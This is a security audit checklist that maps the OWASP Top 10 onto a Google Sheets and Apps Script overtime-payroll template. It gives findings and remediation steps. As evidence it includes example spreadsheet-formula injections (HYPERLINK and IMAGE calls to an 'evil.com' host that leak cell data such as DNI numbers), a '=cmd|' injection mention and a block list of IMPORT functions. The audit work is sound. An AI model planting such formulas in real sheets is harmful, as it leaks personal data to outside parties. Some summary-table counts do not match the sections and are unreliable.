# OWASP Checklist — he-lima template

> **Audit by:** Nora (API & Security Engineer)
> **Date:** 2026-09-24
> **Standard:** OWASP Top 10 (2021) + OWASP API Security Top 10 (2023)
> **Scope:** Google Sheets template + Apps Script runtime + Drive storage
> **Status legend:** ✅ Pass · ⚠️ Partial / needs hardening · ❌ Fail / P0 fix

---

## A01 — Broken Access Control

| Check | Status | Evidence | Action |
|---|---|---|---|
| Spreadsheet shared with least-privilege | ⚠️ | Owner-only currently; will inherit Drive ACL on copy | **Document sharing model in install guide**: Owner = CEO, Editors = supervisores (10 max), Viewers = tecnicos (read-only). |
| Sheet-level protection enforced | ❌ | `00_Config`, `98_DB_*`, `99_Audit_Log` have `visibility:protected/hidden_from_users` but no `protectedRange()` API call | **P0**: `07_TriggersWiring.instalarProtecciones()` must call `Sheet.protect()` on `00_Config`, all `98_DB_*`, `99_Audit_Log`. Only `admin` role can edit. |
| Named-range level restrictions | ⚠️ | DV applied to ranges E2:V110, A2:C60, etc. but no `protectedRange` per range | App `protectedRange` for cells containing formulas (K, L, M, N, O, P, U, V) — `domainUsersOnly=false` + warning-only. |
| Role-based column visibility | ❌ | DNI (col B) and Tarifa (col I) visible to all Editors | **P0**: split into `02_Personas_Public` (no DNI, no Tarifa) + `02_Personas_Priv` (restricted). |
| Drive folder ACL | ⚠️ | Backup folder ACL not specified | **P1**: backup folder owner = CEO only, Editors = read-only, no public links. |

**Risk score: HIGH** — most controls are DV-only (UI hint, not enforcement). Apps Script enforcement is mandatory.

---

## A02 — Cryptographic Failures

| Check | Status | Evidence | Action |
|---|---|---|---|
| Data in transit (TLS) | ✅ | Google Sheets uses HTTPS by default | No action. |
| Data at rest in Sheets | ✅ | Google encrypts at rest (AES-256) by default | No action. |
| Data at rest in backups | ❌ | CSV/xlsx exports to Drive folder are NOT encrypted | **P1**: encrypt backups with AES-256-GCM before upload. Use Apps Script `Utilities.computeHmacSha256Signature()` for key derivation from vault secret. |
| PII columns unencrypted at column level | ⚠️ | DNI column visible in plaintext | Apps Script does not support column-level encryption in Sheets — mitigate via visibility restriction + audit logging. |
| Secrets in code | ✅ | `appsscript.json` declares only `oauthScopes`, no inline secrets | No API keys in template. Vault stores `minimax_api_key` separately. |
| API tokens in logs | ⚠️ | `06_AuditLogger.gs` logs full row payloads | Filter `02_Personas` rows: log `hash(DNI) + last4(DNI)` instead of plaintext DNI. |

**Risk score: MEDIUM** — Google handles in-Sheet encryption; backup exports are the gap.

---

## A03 — Injection

| Check | Status | Evidence | Action |
|---|---|---|---|
| Apps Script `eval()` usage | ✅ | Spec does not call eval; all logic is type-safe | Continue banning eval/static import of user data. |
| Apps Script `executeSql()` usage | ✅ | N/A — no JDBC usage in spec | Continue: no DB connections from this template. |
| SQL/Sheets formula injection | ⚠️ | User-entered values flow into formulas via VLOOKUP / INDIRECT but DV regex blocks malicious strings | **Add DV regex `^[A-Za-z0-9 _\-./]+$` to Observaciones (Q) and Notas (J Personas)** to prevent `=cmd\|...` injection attempts. |
| Apps Script URL injection | ⚠️ | `onEdit` writes to `99_Audit_Log` via `sheet.appendRow([...])` — safe with sanitization | Sanitize all user inputs before `appendRow`: strip control chars, max length 5000 chars per cell. |
| INDIRECT formula injection | ⚠️ | `20_Dashboard` uses `INDIRECT('98_DB_' & B3 & '_' & TEXT(B2, '00'))` — `B3` must be validated | **Critical**: B2 (mes) and B3 (año) must reject values outside 1-12 / 2024-2030 BEFORE INDIRECT resolves. Otherwise attacker passes `B3 = "'+HYPERLINK(...)"` for SSRF-style injection. |
| Apps Script `UrlFetchApp.fetch()` | ✅ | Not used in template (`external_apis: []`) | Document prohibition in install guide. |
| Formula chain depth attack | ✅ | Max chain depth ~8 (`WEEKDAY → COUNTIF → INDEX/MATCH`); well under Sheets limit of 50 | No action. |

**Risk score: MEDIUM** — INDIRECT and Q column are the residual vectors; covered by DV + script-level validation.

---

## A04 — Insecure Design

| Check | Status | Evidence | Action |
|---|---|---|---|
| Race condition in `saveGridToDB` | ❌ | Two editors editing same mes → last-write-wins | **P0**: `LockService.getDocumentLock()` with 30s timeout before read; queue if busy. Sync_Status='conflict' on collision. |
| Race condition in `loadMonthToGrid` | ❌ | Editor A changes dropdown while Editor B edits grid | Same lock; reject B's save with toast "Otro usuario está cambiando mes activo". |
| Time-of-check vs time-of-use | ⚠️ | DV passes (UI), then onEdit runs after — gap of 100ms | **P1**: pre-check in `08_DBSync.preWrite()` re-validates row state including cross-sheet FK existence at write time, not just edit time. |
| State machine for `Estado` | ❌ | Direct edit allowed for any Editor | **P0**: `validarTransicionEstado()` in `08_DBSync.gs` — only `jefe_cuadrilla`+ can move to `validado`; only `admin` can move to `pagado`. |
| Idempotency on retry | ⚠️ | If `saveGridToDB` fails partway, retry can duplicate rows | **P1**: use `Mes_Año + Fecha + ID_Persona` as natural key; ON CONFLICT SKIP. |
| Fail-open on Apps Script error | ⚠️ | Trigger throws → state remains in inconsistent state | **P0**: wrap all critical onEdit handlers in `try/catch` + write to `99_Audit_Log!Error_Trace` column + alert CEO. |
| Principle of least privilege (Apps Script) | ✅ | All modules narrow scope; no cross-module globals | No action. |

**Risk score: HIGH** — race conditions + state machine are foundational gaps.

---

## A05 — Security Misconfiguration

| Check | Status | Evidence | Action |
|---|---|---|---|
| OAuth scopes in `appsscript.json` minimal | ⚠️ | Spec does not declare scopes explicitly | **P0**: declare scopes: `https://www.googleapis.com/auth/spreadsheets.currentonly`, `https://www.googleapis.com/auth/script.container.ui`, `https://www.googleapis.com/auth/drive.file`. **NO gmail, NO forms, NO docs scopes**. |
| Default Apps Script runtime = V8 | ✅ | Spec: `apps_script_runtime: V8` | No action. |
| Execution API enabled | ⚠️ | Not specified — should be OFF for production templates | **Document**: `exec.api: false` in manifest. |
| Web app deployment | ⚠️ | Not specified — should be OFF | Document: no web app deploy for this template. |
| Test deployment safety | ✅ | Triggers limited to `Owner` execution | No action. |
| Error message verbosity | ⚠️ | Apps Script default errors may leak stack to editors | **P1**: wrap errors, return generic "Operación fallida — ver audit log" to user, detailed error only in `99_Audit_Log`. |
| `@onlyCurrentDoc` enforcement | ✅ | Templates should bind script to single doc | Verify in `appsscript.json`: `"addons": { "common": { "homepageTrigger": null } }` — no cross-doc access. |
| API key in `Script Properties` | ⚠️ | Vault is external; verify no keys in `PropertiesService.getScriptProperties()` | **P1**: add CI check `grep -r 'apiKey\\|secret\\|token' go-runtime/internal/templates/he-lima/` returning empty. |

**Risk score: MEDIUM** — scopes declaration + test deployment are the missing pieces.

---

## A06 — Vulnerable & Outdated Components

| Check | Status | Evidence | Action |
|---|---|---|---|
| Third-party Apps Script libraries | ✅ | Spec declares zero libraries (`external_apis: []`) | Continue: ban third-party libraries in `appsscript.json`. |
| V8 runtime version pinning | ⚠️ | Apps Script runtime version not pinned | Apps Script auto-updates V8 — acceptable. Document in install guide that runtime may change. |
| Sheet version drift | ⚠️ | Template copied → user may edit cells/formulas and break formulas | **P1**: include `00_Config!B11 = VERSION()` populated from `architecture.yaml`; `onOpen` warns if `version != expected`. |
| Google Workspace updates | ⚠️ | Sheets API additions may introduce breaking changes | Quarterly review of release notes. |
| Apps Script quotas documented | ✅ | Spec documents limits: triggers 30/user, exec 360s, cache 50MB, UrlFetch 20k/day | Continue. |

**Risk score: LOW** — minimal external surface.

---

## A07 — Identification & Authentication Failures

| Check | Status | Evidence | Action |
|---|---|---|---|
| `Session.getActiveUser()` vs `getEffectiveUser()` | ❌ | Spec uses `Aud_Usuario` populated via simple trigger → returns empty string if sharing is loose | **P0**: use `Session.getEffectiveUser().getEmail()` in **installable triggers only**. Mark column R as informational; `99_Audit_Log!B` is forensic truth. |
| Session uniqueness across tabs | ✅ | Single Spreadsheet, single session | No action. |
| 2FA enforcement | ⚠️ | Workspace 2FA policy not specified | **Document**: require 2FA on Workspace domain for all Editors. |
| Service account for App Script | ⚠️ | Apps Script uses owner's OAuth — not service account | **P1**: use service account for `07_TriggersWiring` and `08_DBSync` to decouple from human owner availability. |
| OAuth consent screen | ⚠️ | Template ships unverified | **P1**: declare scopes explicitly so consent screen is minimal and clear. |
| Re-auth after idle | ✅ | Google handles session expiry | No action. |
| Brute force protection | ✅ | Google handles via Workspace | No action. |

**Risk score: HIGH** — `getActiveUser` returning empty silently corrupts audit trail.

---

## A08 — Software & Data Integrity Failures

| Check | Status | Evidence | Action |
|---|---|---|---|
| Formula integrity vs manual edit | ❌ | Editor can paste values over K, L, M, N, O, P formulas | **P0**: `protectRange()` on computed columns; `onEdit` detects `cell.getFormula() === ''` on a column that should have formula → revert. |
| Audit log append-only enforcement | ⚠️ | Log is "append-only" by convention, not by `protectedRange` | **P1**: protect `99_Audit_Log!A:H` from edit; allow only row append via Apps Script. |
| Backup integrity check | ⚠️ | No checksum on exports | **P1**: SHA-256 of CSV written to backup filename; verify on restore. |
| CI/CD pipeline for `.gs` deployment | ⚠️ | Apps Script projects typically manually edited | **P2**: use `clasp` for version control + CI checks (gofumpt-equivalent for Apps Script). |
| Template versioning | ✅ | `architecture.yaml` has `version: 0.2.0-rev` and `revision_history` | Continue. |
| Git integrity on `.ovav/` | ✅ | `gate_self_hash` chain protects config integrity (per AGENTS.md) | Continue. |
| SBOM for Apps Script | ❌ | No SBOM generated | **P2**: manifest → SBOM converter for Apps Script dependencies (currently empty list). |

**Risk score: HIGH** — formula integrity is the structural backbone; one paste breaks it.

---

## A09 — Security Logging & Monitoring Failures

| Check | Status | Evidence | Action |
|---|---|---|---|
| Audit log exists | ✅ | `99_Audit_Log` sheet, append-only, 8 cols + 10k row capacity | Continue. |
| Coverage of critical events | ⚠️ | Spec lists 8 acciones: `create\|update\|delete\|recalc\|trigger\|sync_load\|sync_save\|sync_create_sheet` | **Add**: `config_change`, `state_transition_rejected`, `auth_spoof_attempt`, `tariff_change_high_delta`. |
| Log retention | ⚠️ | 10k row limit; no archival policy | **P1**: monthly export of `99_Audit_Log` to Drive archive folder (encrypted). |
| Real-time alerting | ❌ | No alerting mechanism | **P0**: `06_AuditLogger.gs` alerts CEO via email (MailApp) for: tarifa delta > 10%, Pago_HE_PEN > threshold, Estado transition rejection. |
| Anomaly detection | ❌ | None | **P2**: simple thresholds (Pago_HE_PEN > 3× median → flag). |
| SIEM integration | ❌ | None | Out of scope for template — workspace SOC consumes Drive audit events. |
| Failed trigger logging | ⚠️ | Trigger errors not captured | **P0**: try/catch in every handler writes to `99_Audit_Log!I` (new column: Error_Trace). |

**Risk score: HIGH** — no real-time alerts; CEO cannot react to incidents in time.

---

## A10 — Server-Side Request Forgery (SSRF)

| Check | Status | Evidence | Action |
|---|---|---|---|
| `UrlFetchApp.fetch()` usage | ✅ | Spec: `external_apis: []` — no outbound fetches | Continue: ban UrlFetchApp in install guide. |
| `UrlFetchApp.fetch` in `06_AuditLogger` | ❌ | Risk if log alerts use webhook | **P0**: use `MailApp.sendEmail()` (Gmail API, server-side) instead of `UrlFetchApp` for alerts. |
| Hyperlink formula injection | ⚠️ | User could insert `=HYPERLINK("evil.com?leak="&A2, "click")` | **P0**: DV regex on Q column (Observaciones) bans `=`, `+`, `-`, `@` prefixes. |
| Image formula injection | ⚠️ | `=IMAGE("evil.com/log?dni=...")` leaks data | Same DV regex above. |
| INDIRECT-to-URL attack | ⚠️ | `INDIRECT('http://...')` resolves to URL not sheet | DV on B2/B3 strictly enforces integer ranges. |
| DNS rebinding | ✅ | N/A — no outbound URLs | No action. |
| ImportXML/ImportData/ImportFeed | ❌ | Spec doesn't list these; verify NOT used | **P0**: lint check in `appsscript.json` install — reject formulas containing `IMPORTXML`, `IMPORTDATA`, `IMPORTFEED`. |

**Risk score: MEDIUM** — formula injection (HYPERLINK/IMAGE) is the realistic vector.

---

## OWASP Top 10 Summary

| ID | Category | Risk | P0 Count | P1 Count | P2 Count |
|---|---|---|---|---|---|
| A01 | Broken Access Control | HIGH | 2 | 1 | 0 |
| A02 | Cryptographic Failures | MEDIUM | 0 | 2 | 0 |
| A03 | Injection | MEDIUM | 1 | 1 | 0 |
| A04 | Insecure Design | HIGH | 3 | 1 | 0 |
| A05 | Security Misconfiguration | MEDIUM | 1 | 2 | 0 |
| A06 | Vulnerable Components | LOW | 0 | 1 | 1 |
| A07 | Identification & Auth Failures | HIGH | 1 | 2 | 0 |
| A08 | Software & Data Integrity | HIGH | 1 | 2 | 1 |
| A09 | Logging & Monitoring | HIGH | 1 | 2 | 1 |
| A10 | SSRF | MEDIUM | 1 | 0 | 0 |
| **TOTAL** | — | — | **11** | **14** | **3** |

→ See `recommendations.md` for prioritized mitigation roadmap.